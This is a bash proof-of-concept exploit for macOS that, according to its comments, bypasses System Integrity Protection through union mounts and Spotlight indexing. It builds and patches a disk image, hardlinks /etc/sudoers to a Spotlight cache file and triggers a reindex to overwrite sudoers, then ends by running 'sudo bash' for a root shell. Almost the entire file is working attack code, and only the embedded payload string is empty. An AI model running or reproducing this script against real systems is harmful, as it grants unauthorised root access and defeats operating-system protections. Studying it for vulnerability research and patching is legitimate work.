#!/bin/bash
########
# SIP mount-relative bypass for batsignal
# 
# MacOS is still vulnerable to batsignal, because the Sandbox fix removes
# one vector, but union mounts apparently don't care about 'mount-relative'.
# 
# This itself seems like a huge bug.
# 
# In this case, we:
#  1) create a volume
#  2) mount it, copy payload, activate spotlight
#  3) wait until spotlight creates the Cache folder and contents
#  4) get the ID spotlight generates from /Store-V2/???...???/Cache/
#  5) umount
#  6) create the same directory layout outside the volume:
#     ./mnt/.Spotlight-V100/Store-V2/???...???/Cache/0000/0000/0000/
#  7) remount with union
#  8) issue a reindex. This time spotlight will erroneously use our
#     directory outside the volume, allowing us to use hardlinks
#  9) hardlink the $INODE.tmp (18.tmp on my machine) file to sudoers as before
# 10) reindex to trigger the overwrite of 18.tmp with our content
#
# After the exploit ran sudoers is overwritten with content we provided.
# 
# The bug exists because apparently union mounted directories are not
# accounted for in SIP, SIP still thinks we are under:
#    (mount-relative-regex #"^/\.Spotlight-V100($|/)"
# 
# While this is *technically* true, it renders mount-relative-regex
# useless.
# 
########

set -e

function clean ()
{
    rm -rf mnt/
    mkdir -p mnt

    rm -f payload.pdf
    # just a plain pdf with the valid sudoers payload in it
    echo "" | base64 -d > payload.pdf
}

function create ()
{
    rm -f dangervol.dmg
    hdiutil create -size 64m -fs "HFS+" -volname test dangervol.dmg
}

function firstmount ()
{
    mkdir -p ./mnt/

    hdiutil attach dangervol.dmg -nobrowse -owners off -mountpoint mnt
    mount -t hfs -o update,noowners,union "/dev/${1}s1" mnt
}

function secondmount ()
{
    hdiutil attach dangervol.dmg -nobrowse -owners off -mountpoint mnt
    mount -t hfs -o update,noowners,union "/dev/${1}s1" mnt/
}

function editbinary ()
{
	# modify spotlight dir's name so SIP doesn't care

	# original: 2e00530070006f0074006c0069006700680074002d005600310030003000 - .Spotlight-V100
	# modified: 2e00530070006f0074006c0069006700680074002d005600390030003000 - .Spotlight-V900
	original="2e00530070006f0074006c0069006700680074002d005600310030003000"
	modified="2e00530070006f0074006c0069006700680074002d005600390030003000"

	if [[ $1 == "forward" ]]
	then
		echo "Patching forward"
		A=$original
		B=$modified
	else
		echo "Patching backward"
		A=$modified
		B=$original
	fi

	mv dangervol.dmg oldvol.dmg
	xxd -p oldvol.dmg | tr -d "\n" | sed "s/$A/$B/g" | xxd -r -p > dangervol.dmg;
}

function umount ()
{
    diskutil eject "$1"
}

echo "[+] Finding disk name"
#tmpdiskname=$(diskutil list | grep "^/dev/disk" | cut -d " " -f 1 | tail -n 1 | cut -d "/" -f 3)
tmpdiskname=$(ls /dev/disk* | grep -v "s[0-9]" | cut -d "/" -f 3 |tail -n 1)
disknum=${tmpdiskname:4:5}

DISKNAME="disk$(($disknum+1))"
echo "[+] Disk name: $DISKNAME"

echo "[+] Cleaning"
clean

echo "[+] Creating volume"
create

echo "[+] First mount"
firstmount $DISKNAME

echo "[+] Copying payload"
cp payload.pdf mnt/
sleep 3

echo "[+] Activating spotlight"
mdutil -i on mnt
sleep 5

echo "[+] Umount disk"
umount $DISKNAME

echo "[+] Patch binary"
editbinary "forward"

echo "[+] Mount patched"
secondmount $DISKNAME

echo "[+] Searching for inode"
INODE=$(stat mnt/payload.pdf | cut -d " " -f 2)
echo "[+] Found inode: $INODE"

echo "[+] Getting volume id"
volumeid=$(ls mnt/.Spotlight-V900/Store-V2/)
echo "[+] Volumeid: $volumeid"

echo "[+] Umounting disk"
umount $DISKNAME


echo "[+] Creating our dir structure for cache"
outsidedir="mnt/.Spotlight-V100/Store-V2/$volumeid/Cache/0000/0000/0000/"
mkdir -p $outsidedir

volumeid=$(stat $outsidedir | cut -d " " -f 1)
inode=$(stat $outsidedir | cut -d " " -f 2)
magicname="/.vol/$volumeid/$inode/"

echo "[+] Magicname: $magicname"


echo "[+] Patch binary back"
editbinary backward

echo "[+] Mount patched"
secondmount $DISKNAME
sleep 3


echo "[+] Running reindex"
mdutil -E mnt
sleep 5

# TODO: retry if this fails
echo "[?] Files in our directory"
ls -ali $magicname/
stat $magicname/*

sudo_volid=$(stat /etc/sudoers | cut -d " " -f 1)
ourfile_volid=$(stat $magicname/$INODE.txt | cut -d " " -f 1)

if [[ $sudo_volid == $ourfile_volid ]]
then
    echo "[+] Volume IDs match, $INODE.tmp is on the same volume as sudoers :)"
else
    echo "[-] Volume IDs don't match, aborting :("
    echo "Aborting, volume stays mounted for examination."
    echo "Our underlying directory that should have $INODE.txt is at: $magicname"
    exit 1
fi

echo "[+] Replacing $INODE.tmp with hardlink to sudoers"
ln /etc/sudoers $magicname/$INODE.tmp

echo "[?] Sudoers before"
stat /etc/sudoers

echo "[+] Reindex"
mdutil -E mnt

echo "[+] Waiting 5s"
sleep 5

echo "[?] sudoers after"
stat /etc/sudoers

echo "[+] Umounting"
umount $DISKNAME

echo "[+] Cleanup"
rm -rf dangervol.dmg oldvol.dmg payload.pdf mnt

echo "[+] Done, enjoy your shell :)"
sudo bash

